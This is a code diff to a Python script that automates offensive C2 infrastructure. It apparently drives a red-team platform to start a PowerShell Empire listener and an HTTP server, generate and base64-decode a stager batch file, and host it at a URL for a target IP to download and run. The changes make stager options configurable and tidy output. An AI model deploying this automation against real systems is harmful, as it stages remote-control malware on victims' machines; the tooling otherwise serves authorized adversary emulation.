@@ -1,6 +1,7 @@
 # Import the supporting Python packages.
 import re
 import os
+import ast
 import string
 import random
 import pprint
@@ -53,6 +54,7 @@ c2_listener_port = config.get('c2_task', 'listener_port')
 c2_listener_tls = config.get('c2_task', 'listener_tls')
 c2_domain_name = config.get('c2_task', 'domain_name')
 c2_cert_subj = config.get('c2_task', 'cert_subj')
+c2_stager = ast.literal_eval(config.get('c2_task', 'stager'))
 http_server_port = config.get('http_server_task', 'http_port')
 http_server_tls = config.get('http_server_task', 'tls')
 http_server_domain_name = config.get('http_server_task', 'domain_name')
@@ -108,7 +110,7 @@ def clean_up():
 
 
 # Get the public IP address where the C2 agent will be installed.
-target_ip = input('Please enter the public IP address that will download and run the C2 agent.')
+target_ip = input('\nPlease enter the public IP address that will download and run the C2 agent: ')
 
 # Create a portgroup for the HTTP server task.
 print(f'\nCreating a portgroup for the HTTP server.')
@@ -142,9 +144,9 @@ http_server_task = h.task_startup(
 http_server_exists = http_server_task_name
 http_server_task_ip = http_server_task['attack_ip']
 print(f'\nThe http_server task is ready with the following parameters:')
-print(f'\nIP - {http_server_task_ip}')
-print(f'\nHost name - {http_server_task_host_name}')
-print(f'\nDomain name - {http_server_domain_name}')
+print(f'IP - {http_server_task_ip}')
+print(f'Host name - {http_server_task_host_name}')
+print(f'Domain name - {http_server_domain_name}')
 
 # Launch a powershell_empire task for the listener.
 c2_task_name = f'c2_server_{sdate}'
@@ -164,9 +166,9 @@ c2_task = h.task_startup(
 c2_task_exists = c2_task_name
 c2_task_ip = c2_task['attack_ip']
 print(f'\nThe powershell_empire task is ready with the following parameters:')
-print(f'\nIP - {c2_task_ip}')
-print(f'\nHost name - {c2_task_host_name}')
-print(f'\nDomain name - {c2_domain_name}')
+print(f'IP - {c2_task_ip}')
+print(f'Host name - {c2_task_host_name}')
+print(f'Domain name - {c2_domain_name}')
 
 # Use a random string for the PowerShell Empire instruct_instance.
 http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
@@ -193,10 +195,10 @@ instruct_args = {'listen_port': int(http_server_port), 'ssl': http_server_tls}
 instruct_command = 'start_server'
 http_service = h.interact_with_task(http_server_task_name, http_instruct_instance, instruct_command, instruct_args)
 if http_service['outcome'] == 'success':
-    print('\nstart_server succeeded.\n')
+    print('start_server succeeded.\n')
     http_service_exists = [http_server_task_name, http_instruct_instance]
 else:
-    print('\nstart_server failed... Exiting.\n')
+    print('start_server failed... Exiting.\n')
     clean_up()
 
 # Use a random string for the PowerShell Empire instruct_instance.
@@ -204,6 +206,7 @@ c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in rang
 
 # If TLS listener requested for powershell_empire listener, generate a certificate.
 if c2_listener_tls.lower() == 'true':
+    print('\nGenerating a certificate to support a TLS C2 listener.')
     subj = None
     if c2_domain_name != 'None':
         subj = re.sub('\$HOST', f'{c2_task_host_name}.{c2_domain_name}', c2_cert_subj)
@@ -213,15 +216,15 @@ if c2_listener_tls.lower() == 'true':
     instruct_args = {'subj': subj}
     cert_gen = h.interact_with_task(c2_task_name, c2_instruct_instance, instruct_command, instruct_args)
     if cert_gen['outcome'] == 'success':
-        print('\ncert_gen succeeded.\n')
+        print('cert_gen succeeded.\n')
     else:
-        print('\ncert_gen failed... Exiting.\n')
+        print('cert_gen failed... Exiting.\n')
         clean_up()
 
 # Cycle through listener profiles for the powershell_empire task.
 c2_listener_profile = None
 while c2_listener_profile != 'exit':
-    c2_listener_profile = input('Enter a C2 profile name or enter "exit" to initiate clean up.')
+    c2_listener_profile = input('Enter a C2 profile name or enter "exit" to initiate clean up: ')
     # Initiate clean up if "exit" entered as profile name.
     if c2_listener_profile == 'exit':
         print('Received "exit" input. Initiating clean up...')
@@ -273,10 +276,11 @@ while c2_listener_profile != 'exit':
     print(f'\nGenerating a stager for the {c2_listener_profile} listener.')
     instruct_command = 'create_stager'
     instruct_args = {
-        'Listener': f'{c2_listener_profile}',
-        'StagerName': 'launcher',
-        'OutFile': f'{c2_listener_profile}.bat'
+        'Listener': f'{c2_listener_profile}'
     }
+    for k, v in c2_stager.items():
+        instruct_args[k] = v
+    outfile = instruct_args['OutFile']
     create_stager = h.interact_with_task(c2_task_name, c2_instruct_instance, instruct_command, instruct_args)
     if create_stager['outcome'] == 'success':
         print('\ncreate_stager succeeded.\n')
@@ -285,22 +289,22 @@ while c2_listener_profile != 'exit':
         print(create_stager)
         continue
     output = create_stager['stager']['launcher']['Output']
-    subprocess.call(f'echo {output} | base64 -d > {c2_listener_profile}.bat', shell=True)
+    subprocess.call(f'echo {output} | base64 -d > {outfile}', shell=True)
 
     # Upload the stager file to the shared workspace
     print('\nUploading the stager file to the shared workspace.')
-    f = open(f'{c2_listener_profile}.bat', 'rb')
+    f = open(f'{outfile}', 'rb')
     raw_file = f.read()
-    h.create_file(f'{c2_listener_profile}.bat', raw_file)
-    stager_exists = f'{c2_listener_profile}.bat'
+    h.create_file(f'{outfile}', raw_file)
+    stager_exists = f'{outfile}'
 
     # Use a random string for the http_server instruct_instance.
     http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
 
     # Make sure there isn't an existing stager file with the same name on the http_server task.
-    print(f'\nDeleting any existing {c2_listener_profile}.bat stager from http_server task {http_server_task_name}.')
+    print(f'\nDeleting any existing {outfile} stager from http_server task {http_server_task_name}.')
     instruct_command = 'del'
-    instruct_args = {'file_name': f'{c2_listener_profile}.bat'}
+    instruct_args = {'file_name': f'{outfile}'}
     delete_old_stager = h.interact_with_task(http_server_task_name, http_instruct_instance, instruct_command, instruct_args)
     if delete_old_stager['outcome'] == 'success':
         print('\nFile delete request succeeded.\n')
@@ -325,9 +329,9 @@ while c2_listener_profile != 'exit':
     else:
         protocol = 'http'
     if http_server_task_host_name == 'None':
-        http_server_url = f'{protocol}://{http_server_task_ip}/{c2_listener_profile}.bat'
+        http_server_url = f'{protocol}://{http_server_task_ip}/{outfile}'
     else:
-        http_server_url = f'{protocol}://www.{http_server_domain_name}/{c2_listener_profile}.bat'
+        http_server_url = f'{protocol}://www.{http_server_domain_name}/{outfile}'
     print(
         f'\nWaiting for an agent connection on task {c2_task_name}.\n'
         f'\nThe agent launcher can be downloaded from the HTTP server here:'
